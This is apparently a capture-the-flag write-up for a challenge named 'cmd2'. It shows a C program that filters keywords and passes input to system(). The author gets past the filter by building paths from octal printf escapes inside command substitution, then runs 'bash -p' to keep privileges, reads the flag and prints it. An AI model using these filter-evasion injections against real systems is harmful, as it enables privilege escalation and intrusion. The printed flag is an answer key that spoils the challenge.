# CMD2
this one is a little harder
## Source code
```C
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}

```
Now the older exploit wont work.
I notice that I can't use `/` - so full paths are off the table. I immediately thought about `shell-builtins`.
## `Shell-Builtins`
`bash`, `sh`, and even `cmd` all have `shell-builtins`, those are commands which are not files like the rest of the commands.
In `bash`, you can list the built ins by running `help`. You will notice that `echo`  is one of them.

## `Echo` from the other side
So let's see what echo is capable of:
```sh
man echo
# \xHH   byte with hexadecimal value HH (1 to 2 digits)
```
Looks like `echo` can print `HEX`! nice! we can use this and `$()` to run commands without being catch by the filter!
```sh
# to run bash!
╭─ido@debian /bin  
╰─➤  $(echo -ne '\x2E\x2Fbash')
ido@debian:/bin$
```
Nice! let's chain some `cd` as well:
```sh
./cmd2 'cd ..;cd ..;cd bin;$(echo -ne "\x2E\x2Fbash")'
# cd ..;cd ..;cd usr;cd bin;$(echo -ne "\x2E\x2Fbash")
# sh: 1: -ne: not found
```
`-ne not found`? what? it didn't worked. so let's try without it?
```sh
./cmd2 'cd ..;cd ..;cd bin;$(echo "\x2E\x2Fbash")'
# sh: 1: \x2E\x2Fbash: not found
```
Looks like `echo` is acting wired. let's try `printf`

## `printf` from the other side
`printf` is another built-in which doing the same as `echo`!
let's build the command!
```sh
./cmd2 'cd ..;cd ..;cd bin;$(printf "\x2E\x2Fbash")'
# cd ..;cd ..;cd usr;cd bin;$(printf "\x2E\x2Fbash")
# sh: 1: \x2E\x2Fbash
```
Looks like the man page lied.

### Octal coming in rescue!
Took another look at the `printf` manual and found out about `%b` which can be used to pass the octal version of a char. For example:
```bash
printf "%b%bbash" "\56" "\57"
# ./bash
```
Let's build the command #3
```bash
./cmd2 'cd ..;cd ..;cd bin;$(printf "%b%bbash" "\56" "\57")'
# bash-4.3$
```
We have a non-restricted shell!
let's get the flag:
```sh
/bin/cat /home/cmd2/flag
# /bin/cat: /home/cmd2/flag: Permission denied
```
WTF???? Oh wait I forgot `-p` for bash:
```sh
./cmd2 'cd ..;cd ..;cd bin;$(printf "%b%bbash -p" "\56" "\57")'
/bin/cat /home/cmd2/flag
# FuN_w1th_5h3ll_v4riabl3s_haha
```
This one was fun!